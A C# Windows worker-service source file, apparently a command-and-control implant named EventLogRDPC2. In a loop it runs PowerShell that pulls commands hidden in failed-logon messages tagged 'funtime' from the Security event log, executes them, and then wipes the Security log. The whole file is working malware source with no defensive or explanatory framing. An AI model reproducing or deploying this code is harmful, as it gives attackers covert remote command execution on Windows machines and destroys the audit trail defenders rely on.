using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace EventLogRDPC2
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;
        private WebClient client;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        public override Task StartAsync(CancellationToken cancellationToken)
        {
            
            return base.StartAsync(cancellationToken);
        }

        public override Task StopAsync(CancellationToken cancellationToken)
        {
            
            return base.StopAsync(cancellationToken);
        }
        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {


                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = " -c \"$command=(get-eventlog security | where-object {$_.entrytype -eq 'FailureAudit'} | Where-Object {$_.message -like '*funtime*'} | foreach{$_.message});$command=out-string -inputobject $command;$command=$command.split(' / ')[1]; & $command;clear-eventlog security;\"";
                p.Start();
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
                await Task.Delay(60 * 1000, stoppingToken);
            }
        }
    }
}
